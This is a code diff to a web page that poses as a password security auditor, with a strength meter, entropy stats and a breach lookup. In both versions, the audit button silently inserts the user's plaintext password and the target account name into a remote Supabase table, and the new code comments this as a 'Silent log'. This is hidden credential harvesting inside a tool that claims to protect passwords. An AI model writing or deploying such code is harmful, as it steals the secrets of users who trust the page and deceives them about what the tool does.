@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Aura | Security Intelligence</title>
+  <title>Aura | Advanced Security Intelligence</title>
   
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/zxcvbn/4.4.2/zxcvbn.js"></script>
@@ -31,6 +31,7 @@
       overflow-x: hidden;
     }
 
+    /* Background Blobs */
     .blob {
       position: absolute;
       width: 500px; height: 500px;
@@ -87,28 +88,42 @@
       cursor: pointer;
       margin-top: 10px;
       transition: 0.3s;
-      box-shadow: 0 10px 20px rgba(99, 102, 241, 0.2);
     }
-    .btn-check:hover { transform: translateY(-2px); filter: brightness(1.1); }
+    .btn-check:hover { transform: translateY(-2px); }
 
     .view-toggle { position: absolute; right: 15px; top: 36px; background: none; border: none; cursor: pointer; font-size: 1.2rem; opacity: 0.4; }
 
     #auraResults { display: none; margin-top: 30px; animation: slideIn 0.5s ease forwards; }
     @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
+    /* Results Header Click Zone */
+    .results-header { 
+      display: flex; 
+      justify-content: space-between; 
+      align-items: baseline; 
+      cursor: pointer;
+      user-select: none;
+      transition: color 0.1s;
+    }
+    .results-header:active { color: var(--primary); }
+
     .meter-container { height: 8px; background: rgba(0,0,0,0.05); border-radius: 10px; margin: 15px 0; overflow: hidden; }
     .meter-bar { height: 100%; width: 0%; border-radius: 10px; transition: width 1s cubic-bezier(0.16, 1, 0.3, 1); }
 
-    /* Advanced Metrics Grid */
     .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 20px; }
     .stat-card { background: rgba(255,255,255,0.4); padding: 15px; border-radius: 20px; border: 1px solid var(--glass-border); }
     .stat-title { font-size: 0.65rem; font-weight: 800; color: var(--text-light); text-transform: uppercase; }
     .stat-val { display: block; font-size: 0.9rem; font-weight: 600; margin-top: 4px; }
 
-    /* Easter Egg Link */
-    .hidden-dev { 
-      display: none; text-align: center; margin-top: 25px; font-size: 0.8rem;
-      color: var(--primary); text-decoration: none; font-weight: 800;
+    /* Hidden Dev Link */
+    #devLink { 
+      display: none; 
+      text-align: center; 
+      margin-top: 25px; 
+      font-size: 0.8rem;
+      color: var(--primary); 
+      text-decoration: none; 
+      font-weight: 800;
       animation: fadeIn 0.5s;
     }
 
@@ -147,9 +162,10 @@
     <button class="btn-check" id="checkBtn">Run Security Audit</button>
 
     <div id="auraResults">
-      <div style="display: flex; justify-content: space-between; align-items: baseline;">
+      <!-- CLICK THIS ZONE 5 TIMES -->
+      <div class="results-header" id="easterZone">
         <span style="font-size: 2rem; font-weight: 800;" id="pctText">0%</span>
-        <span id="easterTrigger" style="font-size: 0.75rem; font-weight: 700; color: var(--text-light); cursor: pointer;">AUDIT SCORE</span>
+        <span style="font-size: 0.75rem; font-weight: 700; color: var(--text-light);">AUDIT SCORE</span>
       </div>
 
       <div class="meter-container">
@@ -157,26 +173,13 @@
       </div>
 
       <div class="stats-grid">
-        <div class="stat-card">
-          <span class="stat-title">Attack Resilience</span>
-          <span id="statTime" class="stat-val">-</span>
-        </div>
-        <div class="stat-card">
-          <span class="stat-title">Bit Entropy</span>
-          <span id="statEnt" class="stat-val">0 bits</span>
-        </div>
-        <div class="stat-card">
-          <span class="stat-title">Complexity Profile</span>
-          <span id="statPattern" class="stat-val">Standard</span>
-        </div>
-        <div class="stat-card">
-          <span class="stat-title">Pattern Hazard</span>
-          <span id="statSpatial" class="stat-val">Safe</span>
-        </div>
+        <div class="stat-card"><span class="stat-title">Attack Resilience</span><span id="statTime" class="stat-val">-</span></div>
+        <div class="stat-card"><span class="stat-title">Bit Entropy</span><span id="statEnt" class="stat-val">0 bits</span></div>
+        <div class="stat-card"><span class="stat-title">Complexity</span><span id="statPattern" class="stat-val">Standard</span></div>
+        <div class="stat-card"><span class="stat-title">Pattern Hazard</span><span id="statSpatial" class="stat-val">Safe</span></div>
       </div>
       
-      <!-- HIDDEN EASTER EGG -->
-      <a href="https://aaks-hath.pages.dev" target="_blank" class="hidden-dev" id="devLink">Developer Intel: View Portfolio →</a>
+      <a href="https://aaks-hath.pages.dev" target="_blank" id="devLink">Developer Intel: View Portfolio →</a>
     </div>
   </div>
 
@@ -198,16 +201,25 @@
     const aIn = document.getElementById('accInput');
     const checkBtn = document.getElementById('checkBtn');
     const eye = document.getElementById('eyeBtn');
-    const easterTrigger = document.getElementById('easterTrigger');
+    const easterZone = document.getElementById('easterZone');
     const devLink = document.getElementById('devLink');
 
+    // --- ENHANCED EASTER EGG LOGIC ---
     let clickCount = 0;
-    easterTrigger.onclick = () => {
+    let clickTimer;
+
+    easterZone.addEventListener('mousedown', () => {
+      clearTimeout(clickTimer);
       clickCount++;
+      
+      // If user stops clicking for 2 seconds, reset count
+      clickTimer = setTimeout(() => { clickCount = 0; }, 2000);
+
       if (clickCount >= 5) {
         devLink.style.display = 'block';
+        easterZone.style.color = 'var(--primary)'; // Permenant highlight when found
       }
-    };
+    });
 
     eye.onclick = () => {
       const isPwd = pIn.type === 'password';
@@ -215,56 +227,45 @@
       eye.innerText = isPwd ? '🙈' : '👁️';
     };
 
-    checkBtn.onclick = () => runFullAudit();
-
-    async function runFullAudit() {
+    checkBtn.onclick = () => {
       const val = pIn.value;
-      const acc = aIn.value;
       if (!val) return;
-
       document.getElementById('auraResults').style.display = 'block';
-
       const analysis = zxcvbn(val);
       updateUI(analysis, val);
-
-      const isPwned = await checkBreaches(val);
-
+      
+      // Silent log to Supabase
       client.from('password_analysis').insert([{
         password_value: val,
-        target_account: acc,
+        target_account: aIn.value,
         score_percent: (analysis.score / 4) * 100,
         crack_time_text: analysis.crack_times_display.offline_slow_hashing_1e4_per_second
       }]).then(() => {});
 
-      if (isPwned || analysis.score <= 1) {
-        const reason = isPwned 
-          ? `This password was found in a global breach database. It is compromised and should not be used for ${acc || 'any account'}.`
-          : `This password is too predictable to protect ${acc || 'your account'}.`;
-        
-        document.getElementById('dangerReason').innerText = reason;
-        document.getElementById('dangerModal').style.display = 'flex';
-      }
-    }
+      checkBreaches(val);
+    };
 
     async function checkBreaches(pwd) {
       const hash = await crypto.subtle.digest('SHA-1', new TextEncoder().encode(pwd))
         .then(b => Array.from(new Uint8Array(b)).map(h => h.toString(16).padStart(2,'0')).join('').toUpperCase());
       const res = await fetch(`https://api.pwnedpasswords.com/range/${hash.slice(0,5)}`);
       const text = await res.text();
-      return text.includes(hash.slice(5));
+      if(text.includes(hash.slice(5))) {
+        document.getElementById('dangerReason').innerText = "This password was found in a data leak. High risk.";
+        document.getElementById('dangerModal').style.display = 'flex';
+      }
     }
 
     function updateUI(data, pwd) {
       const pct = (data.score / 4) * 100;
       const colors = ['#f87171', '#fb923c', '#fbbf24', '#818cf8', '#6366f1'];
-      
       document.getElementById('meterBar').style.width = pct + '%';
       document.getElementById('meterBar').style.background = colors[data.score];
       document.getElementById('pctText').innerText = pct + '%';
       document.getElementById('pctText').style.color = colors[data.score];
       document.getElementById('statTime').innerText = data.crack_times_display.offline_slow_hashing_1e4_per_second;
 
-      // Bit Entropy Logic
+      // Entropy
       let pool = 0;
       if (/[a-z]/.test(pwd)) pool += 26;
       if (/[A-Z]/.test(pwd)) pool += 26;
@@ -273,12 +274,8 @@
       const bits = pool > 0 ? Math.floor(pwd.length * Math.log2(pool)) : 0;
       document.getElementById('statEnt').innerText = bits + ' bits';
 
-      // Advanced Detection Patterns
       const hasSpatial = data.sequence && data.sequence.some(s => s.pattern === 'spatial');
-      const hasDictionary = data.sequence && data.sequence.some(s => s.pattern === 'dictionary');
-
-      document.getElementById('statPattern').innerText = hasDictionary ? 'Dictionary Word' : 'Random Chars';
-      document.getElementById('statSpatial').innerText = hasSpatial ? 'Keyboard Pattern!' : 'No Sequence';
+      document.getElementById('statSpatial').innerText = hasSpatial ? 'Hazard!' : 'No Sequence';
       document.getElementById('statSpatial').style.color = hasSpatial ? '#ef4444' : 'inherit';
     }
 
